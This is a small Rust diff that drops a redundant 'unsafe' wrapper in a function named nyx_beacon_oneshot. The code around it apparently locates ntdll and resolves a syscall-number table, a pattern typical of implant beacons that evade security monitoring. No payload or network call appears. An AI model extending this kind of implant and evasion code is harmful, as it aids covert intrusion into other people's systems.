@@ -63,7 +63,7 @@ pub unsafe extern "system" fn nyx_entry() {
 #[no_mangle]
 pub unsafe extern "system" fn nyx_beacon_oneshot() {
     let Some(ntdll) = LiveNtdll::locate() else {
-        unsafe { core::hint::spin_loop() };
+        core::hint::spin_loop();
         return;
     };
     let _ssn_table = ntdll.resolve_table_owned();
